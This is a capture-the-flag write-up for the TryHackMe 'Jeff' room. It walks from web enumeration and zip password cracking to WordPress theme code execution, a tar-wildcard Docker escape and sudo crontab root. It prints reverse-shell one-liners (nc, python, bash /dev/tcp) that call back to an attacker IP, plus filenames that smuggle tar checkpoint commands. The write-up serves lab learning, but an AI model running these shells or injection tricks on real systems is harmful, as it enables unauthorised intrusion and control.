[Jeff](https://tryhackme.com/room/jeff) is a hard rated linux room in Tryhackme by [jB](https://tryhackme.com/p/jB). This writeup contains directory and file bruteforcing with gobuster, zip password cracking using john, code execution on wordpress site, docker escape using misconfigured cronjob and getting a root shell using the entry on the sudoers file.

# Port Scan
## All Port Scan
```console
reddevil@ubuntu:~/Documents/tryhackme/jeff$ nmap -p- --min-rate 10000 -v -oN nmap/all-ports 10.10.243.186

```
SSH doesnot have that much of attack surface, so let us start our enumeration with HTTP service.

# Port 80
```console
reddevil@ubuntu:~/Documents/tryhackme/jeff$ curl http://10.10.243.186/
<!-- Did you forget to add jeff.thm to your hosts file??? -->
```
The home page is just a blank page with comment to remind us to add jeff.thm to our /etc/hosts file. So, lets add the entry to our hosts file.
```console
10.10.243.186   jeff.thm
```
## Visiting jeff.thm
![1](/assets/images/thm/jeff/1.png)
We get a completely different page this time which looks like a personal blog for Jeff where he talks about a wordpress site and his ability to code on assembly, C and PHP.

## Directory and Files Bruteforcing using Gobuster
```console
reddevil@ubuntu:~/Documents/tryhackme/jeff$ gobuster dir -u http://jeff.thm -w /usr/share/wordlists/Seclists/Discovery/Web-Content/raft-small-words.txt -t 50

```
Here we get few more directories. I used multiple wordlists like `directory-list-2.3-medium.txt`, `common.txt`,`big.txt` for fuzzing at the time of enumeration and will not repeat the steps here. It is always better to use multiple wordlists during fuzzing.

So I fuzzed every directory with recusively and with different extension to find the files as well as more directories using gobuster. For example for backups, I used the extensions like zip,tar,tar.gz,bz2,rar and so on and for source_codes I used extensions like php,html,c,c++,asm and so on. I am not going to show all the gobuster result here as it is very straightforward.

## Final Result from Gobuster
![2](/assets/images/thm/jeff/2.png)

From the result, we can see that backup.zip might be intersting to us as it might contain the backup for the webserver.

### Unzipping the backup file
```console
reddevil@ubuntu:~/Documents/tryhackme/jeff/http/backups$ unzip backup.zip 
Archive:  backup.zip
   creating: backup/
   creating: backup/assets/
[backup.zip] backup/assets/EnlighterJS.min.css password: 
```
Looks like we need password to extract the contents of the zip file. 

## Cracking the zip password using john
We can use john to bruteforce the password combination for the zip file. 

### Using zip2john to create the hash
![3](/assets/images/thm/jeff/3.png)

[zip2john](https://github.com/openwall/john/blob/bleeding-jumbo/src/zip2john.c) comes preinstalled on most of the pen testing distros. 
### Using John to crack the hash
```console
reddevil@ubuntu:~# john hash --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
<zip-redacted-password>  (backup.zip)
1g 0:00:00:06 DONE (2020-12-28 09:45) 0.1533g/s 2199Kp/s 2199Kc/s 2199KC/s !!rebound!!..*7Â¡Vamos!
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```
And the password is cracked using **rockyou.txt** wordlist.

### Extracting the zip file
![4](/assets/images/thm/jeff/4.png)
From the extracted files, wpadmin.bak file looks interesting.

### Contents of wpadmin.bak
```console
reddevil@ubuntu:~/Documents/tryhackme/jeff/http/backups/backup$ cat wpadmin.bak 
wordpress password is: <wordpress-redacted-password>
```
And we get the password for a wordpress site but the thing is we still havenot found the wordpress site.

## Vhost Bruteforcing using gobuster

![5](/assets/images/thm/jeff/5.png)

And we get a host called __wordpress.jeff.thm__, so let us add this entry to our /etc/hosts file.
```console
10.10.243.186   jeff.thm wordpress.jeff.thm
```

## Visiting wordpress.jeff.thm
![6](/assets/images/thm/jeff/6.png)
Like the name, we get the wordpress site and we can see a post created by user jeff. So, lets try to login on the admin dashboard with user jeff and the credential that we obtained before.
![7](/assets/images/thm/jeff/7.png)
And using those credentials, we successfully log in.

# Getting a Shell as www-data inside a docker container
Now that we are the admin of the wordpress site, we can try and get a reverse shell using different techniques. Here I am going to change the content of the inactive theme and make it active to get code execution. We could have also uploaded the vulnerable plugin to get code execution.

## Active theme on wordpress site
![8](/assets/images/thm/jeff/8.png)
Twenty twenty is currently active. So lets edit the content of theme twenty seventeen.

### Editing the content of index.php
![9](/assets/images/thm/jeff/9.png)
Here I have replaced the main index.php of the theme **twenty seventeen** with my PHP code, which gets a file `shell.sh` from my local box and executes the file.

### Contents of shell.sh
```console
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.6.31.213 9001 >/tmp/f
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.6.31.213",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.6.31.213",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
bash -i >& /dev/tcp/10.6.31.213/9001 0>&1
```
### Activating New theme
![10](/assets/images/thm/jeff/10.png)


## Getting a shell
![11](/assets/images/thm/jeff/11.png)

Here I have requested the wordpress's homepage using curl and after I made that request, the server requested our local python HTTP Server for file `shell.sh` and the server executes the file giving us a shell as www-data.

## Getting a proper TTY
There was no python or python3 installed on the box. But after some enumeration I found that python3.7 was installed.
```console
www-data@Jeff:/var/www$ find / -type f -iname 'python*' 2>/dev/null
find / -type f -iname 'python*' 2>/dev/null
/usr/share/pixmaps/python3.7.xpm
/usr/share/applications/python3.7.desktop
/usr/share/binfmts/python3.7
/usr/bin/python3.7m
/usr/bin/python3.7
/var/lib/dpkg/info/python3.7-minimal.preinst
/var/lib/dpkg/info/python3.7.postinst
/var/lib/dpkg/info/python3.7.md5sums
/var/lib/dpkg/info/python3.7-minimal.postinst
/var/lib/dpkg/info/python3.7-minimal.md5sums
/var/lib/dpkg/info/python3.7-minimal.postrm
/var/lib/dpkg/info/python3.7-minimal.list
/var/lib/dpkg/info/python3.7-minimal.prerm
/var/lib/dpkg/info/python3.7.prerm
/var/lib/dpkg/info/python3.7.list
/var/lib/python/python3.7_installed
```

Now lets get a proper shell with auto completion feature using python3.7.
```console
www-data@Jeff:/var/www$ python3.7 -c 'import pty;pty.spawn("/bin/bash")'
```
Hit CRTL+z to background the current process and on local box type
```console
reddevil@ubuntu:~/Documents/tryhackme/jeff$ stty raw -echo
```
and type fg and hit enter twice and on the reverse shell export the TERM as xterm.
```console
www-data@Jeff:/var/www$  export TERM=xterm
```
Now we have a proper shell.

## Manual Enumeration
```console
www-data@Jeff:/var/www/html$ ls -la /

```
From the presence of the file **.dockerenv**,we know that we are inside the docker container. So I began to manually enumerate the contents of the webserver.
![12](/assets/images/thm/jeff/12.png)
On the webserver, I found an interesting file called `ftp_backup.php`.

### Content of ftp_backup.php
![13](/assets/images/thm/jeff/13.png)

Looking at this incomplete PHP script, we can see that the script is trying to connect to the FTP server on address **172.20.0.1** which is the IP for the host from which all the docker containers are hosted. But our Nmap scan showed that there was no FTP server open on the normal interface. Maybe the FTP server is configured so that it can be accessed  only from the docker container.

## Port forwarding using [chisel](https://github.com/jpillora/chisel)
Since there is not ftp binary on the docker container, lets create a port tunnelling using chisel and access it from our local box.
### Downloading Chisel Binary using curl
```console
www-data@Jeff:/var/www/html$ curl 10.6.31.213:8000/chisel -o /tmp/chisel
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 7192k  100 7192k    0     0   448k      0  0:00:16  0:00:16 --:--:--  850k
```
### On local box
```console
reddevil@ubuntu:~/Documents/tryhackme/jeff/www$ sudo ./chisel server -p 1880 --reverse
2020/12/28 21:18:18 server: Reverse tunnelling enabled
2020/12/28 21:18:18 server: Fingerprint 15:5d:fc:f3:f3:fc:8a:65:71:f8:8c:8e:85:24:67:4b
2020/12/28 21:18:18 server: Listening on 0.0.0.0:1880...

```

### On remote Box
```console
www-data@Jeff:/tmp$ ./chisel client 10.6.31.213:1880 R:21:172.20.0.1:21
2020/12/28 15:32:51 client: Connecting to ws://10.6.31.213:1880
2020/12/28 15:32:52 client: Fingerprint 45:7c:4d:14:00:e3:bf:5b:3d:e8:28:3b:b6:e5:8e:b0
2020/12/28 15:32:54 client: Connected (Latency 380.583908ms)
```
Now the port forwarding is successful. 

## Enumerating FTP service
![14](/assets/images/thm/jeff/14.png)
Using the credentials, we successfully log in.

```console
ftp> dir 
500 Illegal PORT command.
ftp: bind: Address already in use
```
But I was getting error while running basics commands. So I searched around to find out what those errors meant and found a [article](https://serverfault.com/questions/450651/500-illegal-port-command-using-command-line-ftp) but I was not able get it to work and I was finally able to do the FTP enumeration from the python3.7 inside the docker container.

### Directory Listing on FTP 
```console
www-data@Jeff:/var/www/html$ python3.7
Python 3.7.3 (default, Dec 20 2019, 18:57:59) 
[GCC 8.3.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> import ftplib
>>> session = ftplib.FTP('172.20.0.1','backupmgr','<ftp_readacted_password>')
>>> session.set_pasv(False)
>>> session.dir()
drwxr-xr-x    2 1001     1001         4096 May 18  2020 files
>>> session.cwd('files')
'250 Directory successfully changed.'
>>> session.dir()
```
I was able to get the directory listing when set passive mode to False. On the FTP server we have a folder and the folder files is empty.

Everytime I see a FTP server, I check if I have write permission on the server and if I have write permissions, then I check if the written files are reflected anywhere on the webserver.

### Writing a file
```py
import ftplib
session = ftplib.FTP('172.20.0.1','backupmgr','<ftp_readacted_password>')
session.set_pasv(False)
file = open('test.txt','rb')
session.cwd('files')                          # file to send
session.storbinary('STOR test.txt', file)     # send the file
file.close()                                  # close file and FTP
print(session.dir())
session.quit()
```
Here, I have tried to upload a file called `test.txt` to remote FTP server inside **files** directory.

### Executing the script
```console
www-data@Jeff:/tmp$ echo 'This is a test file' > test.txt
www-data@Jeff:/tmp$ python3.7 upload.py 
-rwxr-xr-x    1 1001     1001           20 Dec 28 16:13 test.txt
None
www-data@Jeff:/tmp$ 
```
And we can clearly see that the file exists on the FTP server which means that we have write permission on the folder **files**. I then checked on all the sites whether the test.txt file is reflected, but I did not find anything.

Struggling at this point for some time, I thought of tar wildcard vulnerability that I have used a lot for privilege escalation on different rooms of THM. But, We can not know for sure what the user has done to implement the backup process. If the user is running a cronjob on the host to create a tar archive of all the files inside the **files** directory, then we can abuse that to get code execution on the host.

Using this [article](https://www.hackingarticles.in/exploiting-wildcard-for-privilege-escalation/), I have created and uploaded 3 files.

## Reverse Shell as backupmgr

### Content of shell.sh
```console
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.6.31.213 9001 >/tmp/f
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.6.31.213",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.6.31.213",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
bash -i >& /dev/tcp/10.6.31.213/9001 0>&1
```

### Content of upload.py
```py
import ftplib
session = ftplib.FTP('172.20.0.1','backupmgr','<ftp_readacted_password>')
session.set_pasv(False)
file = open('shell.sh','rb')
session.cwd('files')                          # file to send
session.storbinary('STOR shell.sh', file)     # send the file
file.close()                                  # close file and FTP
file = open('--checkpoint=1','rb')
session.storbinary('STOR ' + '--checkpoint=1', file)     # send the file
file.close()                                             # close file and FTP
file = open('--checkpoint-action=exec=sh shell.sh','rb')
session.storbinary('STOR ' + '--checkpoint-action=exec=sh shell.sh', file)     # send the file
file.close()                                                                   # close file and FTP
session.quit()
```
Here I have uploaded three files, one is shell.sh which contains bunch of reverse shell payloads and other two are used to abuse the tar wildcard vulnerability with will execute the file shell.sh.

### Executing upload.py
![15](/assets/images/thm/jeff/15.png)
And after a while we get a shell as backupmgr on the host.

# Privilege Escalation
I ran linpeas and found a non standard binary with GUID bit set.
### Searching for GUID binaries
![16](/assets/images/thm/jeff/16.png)
Here **/opt/systools/sytool** binary has GUID bit set and is owned by group **pwman**. If we can find any misconfiguration on this binary, it will be great as the binary runs with the effective privilege of group **pwman**.

## Reversing the binary with Ghidra
I opened a python HTTP server on the host, downloaded the binary and reversed it with ghidra.

### Running the binary
![17](/assets/images/thm/jeff/17.png)
![18](/assets/images/thm/jeff/18.png)
We can select 3 options in which
- 1 -> gives the list of the running processes. 
- 2 \-> Dont know (Can be found after reversing)
- 3  \-> Exits the program


## Main function
```c
undefined8 main(void)

{
  char *pcVar1;
  char local_418 [1032];
  int local_10;
  int local_c;
  
  local_c = 0;
  banner();
  do {
    options();
    printf("Chose your option: ");
    pcVar1 = fgets(local_418,0x400,stdin);
    if (pcVar1 == (char *)0x0) {
      return 1;
    }
    local_10 = atoi(local_418);
    if (local_10 == 3) {
      local_c = 1;
    }
    else {
      if (local_10 < 4) {
        if (local_10 == 1) {
          system("/bin/ps aux");
        }
        else {
          if (local_10 == 2) {
            readFile();
          }
        }
      }
    }
  } while (local_c == 0);
  return 0;
}
```
Lokking at the code, if the option is 1, it call system with argument **/bin/ps aux** and if the option is 2, it calls another function called **readFile()**.

### Content of function readFile
```c

undefined8 readFile(void)

{
  int __c;
  FILE *__stream;
  undefined8 uVar1;
  undefined4 extraout_var;
  
  __stream = fopen("message.txt","r");
  if (__stream == (FILE *)0x0) {
    __c = puts("\n\nError opening file. Please check that it exists.\n");
    uVar1 = CONCAT44(extraout_var,__c);
  }
  else {
    puts("\n");
    while( true ) {
      __c = fgetc(__stream);
      if (__c == -1) break;
      putchar(__c);
    }
    puts("\n");
    fclose(__stream);
    uVar1 = 1;
  }
  return uVar1;
}
```
We can see that the `readFile()` function is trying to read the content of the file **message.txt**.

### File Permissions of message.txt
```console
backupmgr@tryharder:/opt/systools$ ls -la
total 32
drwxrwxrwx 2 jeff jeff   4096 May 24  2020 .
drwxr-xr-x 4 root root   4096 May 24  2020 ..
-rwxrwxrwx 1 root root    108 May 24  2020 message.txt
-rwxr-sr-x 1 jeff pwman 17160 May 24  2020 systool
```
We can see that the message.txt file is owned by root but has all read, write and execute permission for everyone. This means we can create a symbolic link to any file that is owned by group pwman and can read the file using the **systool** binary.

### Finding files owned by pwman
```console
backupmgr@tryharder:/opt/systools$ find / -type f -group pwman -ls 2>/dev/null
   795411     20 -rwxr-sr-x   1 jeff     pwman       17160 May 24  2020 /opt/systools/systool
  1056230      4 -rwxr-x---   1 jeff     pwman          43 May 11  2020 /var/backups/jeff.bak
```
And we find two files. The jeff.bak file looks interesting. Lets try to read the content of the jeff.bak file.

### Contents of /var/backups/jeff.bak

Here I have create a symbolic link to that file and read the file using the binary which gives us the password for jeff. Lets try to login to the box with this credentials.

### Logging in as jeff using SSH
![20](/assets/images/thm/jeff/20.png)
And we successfully log in using SSH. But it seems to have rbash as the default shell for jeff which is preventing us from executing code having / on them.
```console
jeff@tryharder:~$ id
-rbash: /usr/lib/command-not-found: restricted: cannot specify `/' in command names
```
This can be easily bypassed as we can change the user from the backupmgr using su.

## Checking sudoers entry using sudo -l
![22](/assets/images/thm/jeff/22.png)
It turns our user jeff can run crontab as root, which means we can open up a vim with sudo permission and can get a shell that way.
```console
jeff@tryharder:/opt/systools$ sudo /usr/bin/crontab -e
```
### Spawning a bash shell from vim
![23](/assets/images/thm/jeff/23.png)

```console
root@tryharder:/tmp# id
uid=0(root) gid=0(root) groups=0(root)
```
And we have owned the box.
